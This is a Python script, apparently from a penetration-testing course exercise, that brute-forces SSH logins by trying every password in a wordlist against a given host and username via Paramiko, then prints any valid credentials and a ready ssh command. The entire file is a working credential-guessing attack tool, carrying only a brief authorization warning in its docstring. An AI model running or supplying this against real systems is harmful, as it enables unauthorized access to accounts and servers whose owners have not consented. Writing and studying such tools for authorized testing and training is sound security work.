#!/usr/bin/env python3
"""
SSH Brute Force Tool
Python for Pentesters - Task 7

Automates SSH credential testing by iterating through a wordlist
of passwords against a target host and username. Uses Paramiko
for SSHv2 communication.

WARNING: Only use against systems you own or have explicit written
authorization to test. Unauthorized access is illegal.

Usage:
    python3 ssh_brute.py <target> <username> <wordlist> [port]

Example:
    python3 ssh_brute.py 10.10.10.5 admin passwords.txt 22
"""

import paramiko
import sys


def try_credential(target, username, password, port=22):
    """Attempt SSH login with the given credentials. Return True on success."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=port, username=username, password=password, timeout=5)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, OSError) as e:
        print(f"[!] Connection error: {e}")
        return False


def brute_force_ssh(target, username, wordlist_path, port=22):
    """Try each password in the wordlist against the target SSH server."""
    try:
        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}")
        return None

    print(f"[*] Loaded {len(passwords)} password(s) from {wordlist_path}")
    print(f"[*] Target: {target}:{port}")
    print(f"[*] Username: {username}\n")

    for attempt, password in enumerate(passwords, start=1):
        print(f"[*] Attempt {attempt}/{len(passwords)}: {password}")

        if try_credential(target, username, password, port):
            print(f"\n[+] Password found: {password}")
            return password

    print(f"\n[-] Exhausted wordlist. No valid password found.")
    return None


def main():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <target> <username> <wordlist> [port]")
        print(f"Example: python3 {sys.argv[0]} MACHINE_IP admin passwords.txt 22")
        sys.exit(1)

    target = sys.argv[1]
    username = sys.argv[2]
    wordlist_path = sys.argv[3]
    port = int(sys.argv[4]) if len(sys.argv) > 4 else 22

    result = brute_force_ssh(target, username, wordlist_path, port)

    if result:
        print(f"\n[*] Valid credentials: {username}:{result}")
        print(f"[*] Connect with: ssh {username}@{target}")
    else:
        print(f"\n[*] Try a larger wordlist or a different username.")


main()
